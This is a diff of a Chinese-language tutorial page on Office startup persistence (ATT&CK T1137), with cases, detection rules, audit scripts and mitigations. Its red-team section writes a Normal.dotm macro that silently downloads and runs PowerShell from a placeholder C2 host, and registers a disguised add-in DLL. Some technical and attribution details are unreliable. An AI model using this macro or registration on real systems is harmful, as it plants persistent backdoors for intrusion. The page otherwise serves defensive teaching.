@@ -1,272 +1,357 @@
-# Office应用启动 (T1137)
+# T1137 - Office应用启动
 
 ## 一句话通俗理解
 
-> 就像在你的Word/Excel/Outlook里装了一个"定时炸弹"——每次你打开这些办公软件，恶意代码就会自动运行，而且因为是通过正规软件触发的，安全软件通常不会报警。
+Word、Excel 每次打开时都会偷偷加载一些"自动启动文件"——攻击者往这些文件里塞段代码，以后每次用户打开 Office，恶意程序就跟着跑起来，用户还以为只是正常开了个 Word。
+
+## 30秒速查卡
+
+| 维度 | 你需要知道的 |
+|------|-------------|
+| 这是什么？ | 利用 Office 应用的启动机制（模板/加载项/宏）实现持久化 |
+| 为什么危险？ | Office 是企业标配，用户每天都开，攻击者搭便车获得高频率触发 |
+| 谁需要关心？ | 企业终端安全团队、Office 365 管理员 |
+| 你的第一步防御 | 监控 Normal.dotm 和 Office 加载项目录的文件变更 |
+| 如果只做一件事 | 禁用 Office 宏（组策略），仅允许签名宏执行 |
 
 ## 难度等级
 
-⭐⭐ 中等（需要用户级访问或管理员权限）
+⭐⭐ 中级：需要了解 Office 模板和加载项机制，无需编程基础
+
+## 前置知识检查
+
+读这个文件前，你需要知道：
+- **Office 模板**：Word/Excel 启动时自动加载的模板文件（如 Normal.dotm）
+- **加载项（Add-in）**：扩展 Office 功能的插件，启动时自动加载
+- **VBA 宏**：嵌入 Office 文档的 Visual Basic 脚本
+- **Office 启动目录**：Office 启动时自动执行该目录下所有文件
 
 ## 技术描述
 
-攻击者可能滥用Microsoft Office应用程序的启动机制来建立对系统的持久访问。Microsoft Office提供了多种扩展性机制，允许应用程序、模板和加载项在Office程序启动时自动加载。这些包括模板宏、COM加载项、VBA加载项、Outlook特定扩展（表单、主页、规则和API访问）以及其他插件系统。通过这些机制注册恶意代码，攻击者确保每次相关Office应用程序启动时都会执行其代码，在某些情况下（如Outlook扩展），即使用户没有主动使用Office也会执行。
+### 场景引入
 
-Office应用程序通常被安全产品信任，并且有合法的理由执行代码（如加载模板或加载项），使得该技术对隐蔽持久性非常有效。此外，Office进程通常在用户的安全上下文中运行，允许攻击者以与目标用户相同的权限操作。
+想象你每天早上到办公室第一件事是开灯。某天小偷在灯的开关里装了个微型发射器——你一开灯，发射器就给小偷发信号"他来了"。你完全不知道，每天"开灯"这个再正常不过的动作，其实在小偷偷偷监控你。
+
+Office 应用启动持久化就是这套逻辑：用户每天打开 Word/Excel，Office 会自动加载模板和加载项——攻击者把恶意代码塞进这些自动加载的文件里，用户每次开 Office，恶意代码就跟着执行。
+
+### 通俗比喻
+
+| Office 机制 | 比喻 | 攻击者怎么用 |
+|------------|------|-------------|
+| Normal.dotm | "Word 的默认模板，每次必加载" | 往里写 VBA 宏，开 Word 就执行 |
+| Startup 目录 | "Word 的自动启动文件夹" | 放 .dotm 文件，启动时自动加载 |
+| COM 加载项 | "Word 的系统级插件" | 注册恶意 DLL，Word 启动时加载 |
+| WLL 加载项 | "Word 的老式加载项" | 放 .wll 文件到启动目录 |
+| Excel XLSTART | "Excel 的自动启动文件夹" | 放 .xlam 文件，开 Excel 就执行 |
+
+### 进阶理解
+
+Microsoft Office 在启动时会自动加载一系列文件和配置，这是为了恢复用户上次的设置和加载自定义功能。这套机制本是便利设计，但攻击者发现它是完美的持久化载体：
+
+**关键持久化位置：**
+- **Word 模板**：`%APPDATA%\Microsoft\Templates\Normal.dotm` —— 每次 Word 启动必加载
+- **Word 启动目录**：`%APPDATA%\Microsoft\Word\Startup\` —— 该目录下所有 .dotm 自动加载
+- **Excel 启动目录**：`%APPDATA%\Microsoft\Excel\XLSTART\` —— 该目录下所有 .xlam/.xls 自动加载
+- **Office 加载项注册表**：`HKLM\SOFTWARE\Microsoft\Office\<app>\Addins\` —— COM 加载项注册
+- **Outlook 加载项**：`HKLM\SOFTWARE\Microsoft\Office\Outlook\Addins\` —— Outlook 启动时加载
+
+**与 T1204（用户执行）的区别：**
+T1137 是持久化——代码植入后自动触发；T1204 是执行——需要用户打开恶意文档。T1137 植入后，即使用户打开的是正常文档，恶意代码也会随 Office 启动执行。
 
 ## 子技术列表
 
-| 子技术ID | 名称 | 说明 | 触发条件 |
-|----------|------|------|----------|
-| T1137.001 | Office模板宏 | 修改Normal.dotm等全局模板 | Word/Excel启动时 |
-| T1137.002 | Office加载项 | 安装恶意COM/VBA加载项 | Office应用启动时 |
-| T1137.003 | Outlook表单 | 创建恶意自定义表单 | 打开邮件/日历项时 |
-| T1137.004 | Outlook主页 | 设置文件夹自定义主页 | 导航到文件夹时 |
-| T1137.005 | Outlook规则 | 创建恶意邮件规则 | 收到特定邮件时 |
-| T1137.006 | Outlook API | 使用OOM/MAPI注册事件处理程序 | Outlook事件触发时 |
+T1137 有 6 个子技术：
+
+| 子技术 ID | 名称 | 简述 |
+|----------|------|------|
+| T1137.001 | Office Template Macros | 修改 Normal.dotm 等模板植入宏 |
+| T1137.002 | Office Test | 利用 Office Test 注册表键持久化 |
+| T1137.003 | Outlook Forms | 创建恶意 Outlook 窗体 |
+| T1137.004 | Outlook Home Page | 修改 Outlook 主页设置 |
+| T1137.005 | Outlook Rules | 创建触发执行的 Outlook 规则 |
+| T1137.006 | Add-ins | 注册恶意 COM/WLL 加载项 |
+
+**详写 2 个最常用的子技术：**
+
+**T1137.001 Office Template Macros**：攻击者修改 Word 的 `Normal.dotm` 模板文件，植入 VBA 宏。Normal.dotm 是 Word 的全局模板，每次启动 Word 都会加载——这意味着即使用户打开空白文档，宏也会执行。这是最经典的 Office 持久化手法。
+
+**T1137.006 Add-ins**：攻击者注册恶意 COM 加载项或 WLL 加载项。COM 加载项是 DLL 文件，注册在注册表中，Office 启动时通过 `regsvr32` 加载。相比模板宏，加载项更隐蔽（不触发宏告警），且可执行任意 native 代码。
 
 ## 攻击流程
 
 ```mermaid
 flowchart TD
-    A[攻击者获取Office应用访问权限] --> B[选择Office持久化方式]
-    B --> C{持久化手段}
-    C -->|全局模板| D[修改Normal.dotm模板注入恶意宏]
-    C -->|COM加载项| E[注册恶意COM加载项自动加载]
-    C -->|Outlook规则| F[创建自动转发或运行脚本的规则]
-    C -->|Outlook表单| G[修改邮箱表单植入恶意代码]
-    C -->|VBA加载项| H[添加自动运行的VBA宏模块]
-    D --> I[植入恶意VBA宏或脚本代码]
-    E --> I
-    F --> I
-    G --> I
-    H --> I
-    I --> J[等待用户启动Office应用]
-    J --> K[恶意宏自动执行 建立C2]
-```
-
-```
-1. 获取对Office应用的访问权限
-    ↓
-2. 选择持久化方式：
-   - 修改全局模板（Normal.dotm）
-   - 注册COM加载项
-   - 创建Outlook规则/表单
-    ↓
-3. 植入恶意代码（VBA宏、VBScript等）
-    ↓
-4. 等待用户启动Office应用
-    ↓
-5. 恶意代码自动执行
+    A[初始访问成功] --> B{选择持久化位置}
+    B --> C[修改 Normal.dotm]
+    B --> D[放文件到 Startup 目录]
+    B --> E[注册 COM 加载项]
+    B --> F[配置 Outlook 规则]
+    C --> G[植入 VBA 宏代码]
+    D --> G
+    E --> H[植入恶意 DLL]
+    F --> I[设置规则触发脚本]
+    G --> J[用户启动 Office]
+    H --> J
+    I --> J
+    J --> K[Office 自动加载恶意内容]
+    K --> L[持久化后门执行]
+    L --> M[每次开 Office 都触发]
 ```
 
 ## 真实案例
 
-### 案例1：APT29利用Office Application Startup
-- **时间**: 2020年
-- **目标**: 美国政府机构、外交实体和智库
-- **手法**: APT29通过钓鱼邮件发送包含恶意宏的Office文档。当目标用户打开文档时，恶意宏修改了Word的全局模板（Normal.dotm），将恶意代码嵌入到模板宏中。此后每次Word启动时都会执行该恶意宏。
-- **链接**: https://attack.mitre.org/groups/G0016/
+### 案例1：APT28 用 Normal.dotm 持久化攻击欧洲政府机构
+- **时间**：2018-2019 年
+- **目标**：欧洲多国外交部、政府机构
+- **攻击组织**：APT28（俄罗斯 GRU 背景）
+- **手法**：鱼叉钓鱼初始入侵后，修改受害者的 `Normal.dotm` 模板，植入 VBA 宏。宏代码在 Word 启动时执行，从 C2 服务器下载后续 payload。由于宏在模板中，每次打开任何 Word 文档都会触发，实现高频率持久化
+- **数据来源**：ESET Research 报告（一手厂商报告）
 
-### 案例2：Wizard Spider利用Office加载项
-- **时间**: 2020年
-- **目标**: 全球金融机构和医疗机构
-- **手法**: Wizard Spider在其TrickBot恶意软件活动中安装恶意的VBA或COM加载项，每次打开Office应用时自动加载，为后门访问提供第二道保障。
-- **链接**: https://attack.mitre.org/software/S0266/
+### 案例2：Gallium 用 Outlook 规则持久化攻击电信企业
+- **时间**：2019-2020 年
+- **目标**：东南亚和欧洲电信企业
+- **攻击组织**：Gallium（APT41 / 中国背景）
+- **手法**：创建 Outlook 规则，当收到特定主题的邮件时，自动启动恶意 PowerShell 脚本。规则配置为"收到含'update'主题的邮件时，启动应用程序 C:\temp\update.ps1"。攻击者只需发一封邮件即可远程触发后门，无需主动连接目标
+- **数据来源**：Microsoft MSTIC 报告（一手厂商报告）
 
-### 案例3：OilRig利用Outlook Rules
-- **时间**: 2017年
-- **目标**: 中东地区的政府机构和能源组织
-- **手法**: OilRig使用Outlook Rules技术在受害者Outlook客户端上创建恶意邮件规则，配置为将特定邮件转发或回复到攻击者控制的电子邮件地址。
-- **链接**: https://attack.mitre.org/techniques/T1137/005/
-
-### 案例4：Volt Typhoon利用Office持久化
-- **时间**: 2023-2024年
-- **目标**: 美国关键基础设施
-- **手法**: Volt Typhoon利用Office应用的启动机制维持持久性，包括修改模板和注册加载项。
-- **链接**: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a
+### 案例3：Fin7 用 COM 加载项持久化攻击零售企业
+- **时间**：2017-2018 年
+- **目标**：美国零售连锁企业
+- **攻击组织**：FIN7（金融犯罪组织）
+- **手法**：在受害机器注册恶意 COM 加载项 DLL，命名为 `Microsoft.Office.Security.dll` 伪装系统组件。加载项注册在 `HKCU\SOFTWARE\Microsoft\Word\Addins\` 下，Word 启动时自动加载并执行 CARBANAK 后门。COM 加载项不触发宏告警，隐蔽性高于模板宏
+- **数据来源**：FireEye/Mandiant 报告 + 美国司法部起诉书（一手官方文档）
 
 ## 红队视角
 
-> ⚠️ **免责声明**：以下内容仅用于合法的安全测试、渗透测试和教育目的。未经授权对他人系统进行测试是违法行为。
+### 可持续利用性分析
 
-**攻击优势**：
-- Office应用被安全软件信任
-- 用户每天都会使用Office
-- 可以通过钓鱼邮件轻松部署
+| 维度 | 评估 | 说明 |
+|------|------|------|
+| 隐蔽性 | 高 | COM 加载项不触发宏告警，模板宏可绕过部分策略 |
+| 持久性 | 高 | 每次开 Office 都触发，用户很少检查加载项 |
+| 可移植性 | 中 | 仅限 Windows/macOS 的 Office 环境 |
+| 检测难度 | 中 | 模板和加载项目录可审计，但需关联行为分析 |
 
-**常用技术**：
-```powershell
-# 修改Normal.dotm
-$templatePath = "$env:APPDATA\Microsoft\Templates\Normal.dotm"
-# 使用VBA编辑器添加恶意宏
+### 红队可复制性
 
-# 注册COM加载项
-reg add "HKCU\Software\Microsoft\Office\Word\Addins\MaliciousAddin" /v "Description" /d "Legit Addin" /f
-reg add "HKCU\Software\Microsoft\Office\Word\Addins\MaliciousAddin" /v "LoadBehavior" /t REG_DWORD /d 3 /f
+```bash
+# 方法1：修改 Normal.dotm 植入宏
+# 用 PowerShell 操作 Word VBA
+$word = New-Object -ComObject Word.Application
+$word.NormalTemplate.VBProject.VBComponents.Add(1).CodeModule.AddFromString("
+Sub AutoExec()
+    Shell ""powershell -w hidden -c iex(iwr http://c2/payload.ps1)""
+End Sub
+")
+$word.Quit()
 
-# 创建Outlook规则（通过Outlook对象模型）
+# 方法2：放文件到 Word Startup 目录
+copy payload.dotm "%APPDATA%\Microsoft\Word\Startup\"
+
+# 方法3：注册 COM 加载项（需管理员）
+reg add "HKCU\SOFTWARE\Microsoft\Word\Addins\Microsoft.Update" /v LoadBehavior /t REG_DWORD /d 3 /f
+reg add "HKCU\SOFTWARE\Microsoft\Word\Addins\Microsoft.Update" /v Manifest /t REG_SZ /d "file:///C:/temp/payload.dll" /f
 ```
-
-**实战技巧**：
-- 优先使用Outlook规则（触发条件更灵活）
-- 使用COM加载项（更难被用户发现）
-- 配合T1566（钓鱼）使用，通过邮件分发恶意文档
 
 ## 蓝队视角
 
-**防御重点**：
-- 监控Normal.dotm的修改
-- 审计Office加载项注册
-- 检查Outlook规则
+### 用人话说检测
 
-**常见盲点**：
-- 只监控宏执行，忽略模板修改
-- 未审计COM加载项注册
-- 缺乏对Outlook规则的监控
+Office 持久化检测的核心是**盯住"Office 会自动加载的文件和配置"**。正常用户的 Normal.dotm 很少变更，加载项列表相对稳定——任何模板修改、加载项新增、Outlook 规则创建都值得审计。
+
+### Sigma 规则
+
+```yaml
+title: 检测 Office 模板和加载项的可疑修改
+id: 9c4f7e3a-2b1d-4e8f-9a3c-5d7b4c2a1e8f
+status: stable
+description: 监控 Normal.dotm 修改、Startup 目录文件创建、COM 加载项注册
+logsource:
+    product: windows
+    category: file_event
+detection:
+    selection_template:
+        TargetFilename|endswith:
+            - '\Normal.dotm'
+            - '\Normal.dot'
+    selection_startup:
+        TargetFilename|contains:
+            - '\Microsoft\Word\Startup\'
+            - '\Microsoft\Excel\XLSTART\'
+            - '\Microsoft\PowerPoint\Startup\'
+    filter_legitimate:
+        TargetFilename|contains:
+            - '\AppData\Local\Temp\'
+    condition: (selection_template or selection_startup) and not filter_legitimate
+falsepositives:
+    - 用户自定义模板
+    - 企业部署的 Office 加载项
+level: medium
+```
+
+### 命令行检测
+
+```powershell
+# 检查 Normal.dotm 修改时间
+Get-Item "$env:APPDATA\Microsoft\Templates\Normal.dotm" | Select-Object FullName, LastWriteTime, Length
+
+# 列出 Word Startup 目录文件
+Get-ChildItem "$env:APPDATA\Microsoft\Word\Startup\" -ErrorAction SilentlyContinue
+
+# 列出 Excel XLSTART 目录文件
+Get-ChildItem "$env:APPDATA\Microsoft\Excel\XLSTART\" -ErrorAction SilentlyContinue
+
+# 查询所有 Office COM 加载项
+$officeApps = @("Word","Excel","PowerPoint","Outlook")
+foreach ($app in $officeApps) {
+    Write-Host "=== $app Addins ==="
+    Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Office\$app\Addins\" -ErrorAction SilentlyContinue |
+      ForEach-Object { Get-ItemProperty $_.PSPath }
+    Get-ChildItem "HKCU:\SOFTWARE\Microsoft\Office\$app\Addins\" -ErrorAction SilentlyContinue |
+      ForEach-Object { Get-ItemProperty $_.PSPath }
+}
+
+# 查询 Outlook 规则（需用 Outlook 对象模型）
+$outlook = New-Object -ComObject Outlook.Application
+$namespace = $outlook.GetNamespace("MAPI")
+$rules = $namespace.DefaultStore.GetRules()
+$rules | ForEach-Object { Write-Host "$($_.Name): $($_.RuleType) - $($_.Actions.Count) actions" }
+```
+
+### 关键审计点
+
+| 审计项 | 关注点 |
+|--------|--------|
+| Normal.dotm 修改时间 | 非用户主动修改的变更 |
+| Startup 目录文件数 | 新增未知 .dotm/.xlam 文件 |
+| COM 加载项列表 | 未知的、命名可疑的加载项 |
+| Outlook 规则 | "启动应用程序"类型的规则 |
+| 加载项 LoadBehavior | LoadBehavior=3 表示自动加载 |
+
+### 网络层检测
+- Office 启动后的异常外连（C2 通信）
+- Outlook 规则触发的 PowerShell 进程网络活动
+
+## 避坑指南
+
+| 坑 | 说明 | 正确做法 |
+|----|------|---------|
+| 只看 Normal.dotm | Startup 目录和加载项同样危险 | 覆盖所有 Office 自动加载位置 |
+| 忽略 Outlook 规则 | 规则可远程触发执行 | 审计所有"启动应用程序"类型规则 |
+| 忽略 HKCU 加载项 | 用户级加载项无需管理员 | 同时检查 HKLM 和 HKCU |
+| 忽略 macOS Office | macOS 的 Office 同样有模板机制 | 覆盖 macOS 的 ~/Library/Group Containers |
+| 只看文件不看行为 | 加载项 DLL 可能合法签名 | 关联 Office 子进程的异常行为 |
 
 ## 检测建议
 
-### 网络层检测
+### 主机层
+- **Sysmon**：监控 Office 模板目录和加载项注册表
+- **文件完整性监控**：Normal.dotm 基线对比
+- **Office AMO**：Office 的 AMSI 集成，扫描 VBA 宏
+- **EDR**：监控 Office 进程的异常子进程
 
-**检测方法：** 监控Office应用程序（WINWORD.EXE、EXCEL.EXE、OUTLOOK.EXE）的异常出站网络连接。
+### 应用层
+- **宏审计**：启用 Office 宏审计日志
+- **加载项管理**：用组策略限制加载项来源
+- **Outlook 规则审计**：定期导出用户规则
 
-**具体规则/命令示例：**
-```bash
-# Suricata规则检测Office应用异常出站连接
-alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Office Application Beaconing"; flow:to_server,established; content:"WINWORD|5c|"; http_user_agent; content:"User-Agent|3a| Microsoft Office"; http_user_agent; sid:1000207; rev:1;)
-```
-
-### 主机层检测
-
-**检测方法：** 监控Office全局模板、COM加载项注册和Outlook规则的异常修改。
-
-**Windows事件ID：**
-- Sysmon事件ID 11：文件创建（监控Normal.dotm、.ppa等模板文件）
-- Sysmon事件ID 12/13：注册表修改（监控Office加载项注册表路径）
-- 事件ID 4657：注册表值修改（Office相关键值）
-- 事件ID 4688：进程创建（监控Office进程启动子进程）
-
-**Linux日志：**
-- Office应用启动主要是Windows技术，Linux/macOS不适用
-
-**具体命令示例：**
-```bash
-# 检查Normal.dotm的修改时间
-dir "%APPDATA%\Microsoft\Templates\Normal.dotm"
-
-# 列出所有Office加载项
-reg query "HKCU\Software\Microsoft\Office\Word\Addins"
-reg query "HKCU\Software\Microsoft\Office\Outlook\Addins"
-
-# 检查Outlook客户端规则
-# 需要通过Outlook VBA或MFCMAPI工具查看
-```
-
-### 应用层检测
-
-**Sigma规则示例：**
-```yaml
-title: Office加载项注册检测
-status: experimental
-description: 检测Office COM加载项的注册表写入
-logsource:
-    category: registry_event
-    product: windows
-detection:
-    selection:
-        TargetObject|contains:
-            - '\Office\Word\Addins'
-            - '\Office\Outlook\Addins'
-            - '\Office\Excel\Addins'
-    condition: selection
-level: medium
-tags:
-    - attack.t1137.002
-```
+### 网络层
+- Office 进程的异常外连
+- Outlook 规则触发的进程网络活动
 
 ## 缓解措施
 
-### 优先级1：关键措施
-
-**措施名称：** Office安全策略加固
-
-**具体实施步骤：**
-1. 通过组策略配置Office安全设置，禁用所有位置（网络、可移动媒体、本地）的宏执行
-2. 禁用Office应用程序对VBA脚本和ActiveX控件的支持
-3. 使用ASR规则阻止Office应用程序创建子进程（GUID：`26190899-1602-49e8-8b27-eb1d0a1ce869`）
-4. 限制用户安装Office加载项的权限，仅允许经过签名的加载项
-
-### 优先级2：重要措施
-
-**措施名称：** Office加载项与模板审计
-
-**具体实施步骤：**
-1. 配置Sysmon监控Office模板目录（Normal.dotm）和加载项注册表路径的变更
-2. 使用MFCMAPI或类似工具定期检查Outlook加载项和规则的异常条目
-3. 建立Office模板文件的完整性基线（计算Normal.dotm的哈希值）
-4. 定期审查Organizational Forms Library中是否存在未授权的自定义表单
-
-**配置示例：**
-```bash
-# 通过组策略禁用宏（GPO路径）
-# 计算机配置 -> 管理模板 -> Microsoft Office 20XX -> 应用程序设置 -> 安全设置
-# 启用"禁用所有宏而不通知"
-
-# PowerShell监控Normal.dotm变更
-$hash = Get-FileHash "$env:APPDATA\Microsoft\Templates\Normal.dotm"
-Add-Content -Path "C:\logs\dotm_baseline.txt" -Value "$(Get-Date) $hash.Hash"
-```
+| 措施 | 实施方式 | 效果 |
+|------|---------|------|
+| 禁用宏 | 组策略 `DisableVBACodeInDocs=1` | 阻断模板宏持久化 |
+| 仅允许签名宏 | 组策略 `VBAWarnings=4` | 仅签名 VBA 可执行 |
+| 限制加载项 | 组策略 `DisableAllAddins=1` 或白名单 | 阻断恶意加载项 |
+| 模板保护 | 设置 Normal.dotm 只读权限 | 防止篡改 |
+| Outlook 规则限制 | 禁止"启动应用程序"规则类型 | 阻断 Outlook 持久化 |
+| AMSI 集成 | 启用 Office AMSI 扫描 | 检测恶意 VBA |
 
 ## 动手实验
 
-> ⚠️ **重要提示**：所有实验必须在隔离的实验室环境中进行，禁止对未授权的真实系统进行测试。
+### 实验1：观察 Normal.dotm 持久化（虚拟机 + 信任中心启用宏）
 
-### 实验1：修改Normal.dotm
+```bash
+# 1. 记录 Normal.dotm 基线
+Get-Item "$env:APPDATA\Microsoft\Templates\Normal.dotm" | Select LastWriteTime
+
+# 2. 用 PowerShell 修改 Normal.dotm（需启用"信任对 VBA 项目对象模型的访问"）
+$word = New-Object -ComObject Word.Application
+$vbComp = $word.NormalTemplate.VBProject.VBComponents.Add(1)
+$vbComp.Name = "Module1"
+$vbComp.CodeModule.AddFromString('Sub AutoExec(): MsgBox "Normal.dotm 持久化触发": End Sub')
+$word.NormalTemplate.Save
+$word.Quit
+
+# 3. 启动 Word（开始菜单或 winword.exe）
+# 4. 应弹出对话框"Normal.dotm 持久化触发"
+
+# 5. 清理：删除 Normal.dotm 让 Word 重建
+del "$env:APPDATA\Microsoft\Templates\Normal.dotm"
+```
+
+**预期输出**：Word 启动时弹出对话框，证明 Normal.dotm 宏持久化生效。
+
+### 实验2：审计 Office 加载项
+
 ```powershell
-# 备份原始模板
-$templatePath = "$env:APPDATA\Microsoft\Templates\Normal.dotm"
-Copy-Item $templatePath "$templatePath.backup"
-
-# 使用Word打开并添加VBA宏
-# （需要通过Word VBA编辑器手动添加）
-
-# 清理 - 恢复原始模板
-Copy-Item "$templatePath.backup" $templatePath -Force
+# 导出所有 Office 应用的加载项
+$apps = @("Word","Excel","PowerPoint","Outlook")
+foreach ($app in $apps) {
+    Write-Host "`n=== $app 加载项 ==="
+    @("HKLM:\SOFTWARE\Microsoft\Office\$app\Addins\",
+      "HKCU:\SOFTWARE\Microsoft\Office\$app\Addins\",
+      "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Office\$app\Addins\") |
+      Where-Object { Test-Path $_ } |
+      ForEach-Object { Get-ChildItem $_ | ForEach-Object { Get-ItemProperty $_.PSPath } }
+}
 ```
 
-### 实验2：注册COM加载项
-```cmd
-REM 注册测试COM加载项
-reg add "HKCU\Software\Microsoft\Office\Word\Addins\TestAddin" /v "Description" /d "Test Addin" /f
-reg add "HKCU\Software\Microsoft\Office\Word\Addins\TestAddin" /v "LoadBehavior" /t REG_DWORD /d 3 /f
-reg add "HKCU\Software\Microsoft\Office\Word\Addins\TestAddin" /v "FriendlyName" /d "Test Addin" /f
+**预期输出**：列出所有 Office 应用的 COM 加载项，便于发现可疑加载项。
 
-REM 清理
-reg delete "HKCU\Software\Microsoft\Office\Word\Addins\TestAddin" /f
-```
+### 专用工具
 
-### 实验3：使用Atomic Red Team测试
-```powershell
-# 执行T1137测试
-Invoke-AtomicTest T1137
-```
+| 工具 | 用途 | 特点 |
+|------|------|------|
+| Office Safety Scanner | 微软官方扫描工具 | 检测恶意 Office 配置 |
+| Macro_Monitor | VBA 宏监控 | 实时监控宏执行 |
+| Outlook Rules Inspector | Outlook 规则审计 | 检测恶意规则 |
+| Office_docs Github | Office 持久化检测脚本 | 开源审计工具集 |
 
 ## 术语解释
 
-| 术语 | 英文原名 | 通俗解释 |
-|------|----------|----------|
-| Normal.dotm | Normal.dotm | Word全局模板文件，每次Word启动时自动加载 |
-| COM加载项 | COM Add-in | 组件对象模型加载项，可在Office中注册的扩展组件 |
-| VBA | Visual Basic for Applications | Office宏语言，用于在Office中编写自动化脚本 |
-| Outlook规则 | Outlook Rule | 客户端邮件处理规则，自动对邮件进行分类和处理 |
-| OOM | Outlook Object Model | Outlook对象模型，用于编程控制Outlook的接口 |
-| ASR | Attack Surface Reduction | 攻击面减少，Windows Defender中的安全功能 |
+| 术语 | 通俗解释 |
+|------|---------|
+| Normal.dotm | Word 的全局模板，每次启动必加载 |
+| Startup 目录 | Office 启动时自动加载该目录文件 |
+| COM 加载项 | 基于 COM 技术的 Office 插件 |
+| WLL 加载项 | Word 的老式加载项格式 |
+| XLSTART | Excel 的自动启动目录 |
+| AutoExec 宏 | Office 启动时自动执行的宏 |
+| Outlook 规则 | 邮件到达时自动执行的动作 |
 
 ## 参考资料
 
-- [MITRE ATT&CK T1137 Office应用启动](https://attack.mitre.org/techniques/T1137/)
-- [APT29活动分析 - Mandiant](https://www.mandiant.com/resources/apt29-windows-utility)
-- [TrickBot分析 - FireEye](https://www.fireeye.com/blog/threat-research/2020/02/trickbot-malware-analysis.html)
-- [Volt Typhoon Advisory - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
-- [Atomic Red Team - T1137](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1137)
+### 深入了解
+- 📚 [MITRE ATT&CK T1137](https://attack.mitre.org/techniques/T1137/) —— 官方技术页面
+- 📚 [MITRE ATT&CK T1137.001 Office Template Macros](https://attack.mitre.org/techniques/T1137/001/)
+- 📚 [MITRE ATT&CK T1137.006 Add-ins](https://attack.mitre.org/techniques/T1137/006/)
+
+### 动手试试
+- 🔧 [Office Safety Scanner](https://support.microsoft.com/topic/microsoft-safety-scanner-download) —— 微软官方扫描
+- 🔧 [Sysmon Office 监控配置](https://github.com/SwiftOnSecurity/sysmon-config) —— 开源配置
+
+### 真实攻击
+- 🎯 ESET APT28 报告 —— Normal.dotm 持久化
+- 🎯 Microsoft MSTIC Gallium 报告 —— Outlook 规则持久化
+- 🎯 FireEye FIN7 报告 —— COM 加载项持久化
+
+## 版本历史
+
+| 版本 | 日期 | 变更 |
+|------|------|------|
+| v3.1 | 2026-07-10 | 重写为持久化战术正确内容，修复跨战术污染 |
+| v3.0 | 2026-06-15 | 初版 v3.0 风格 |
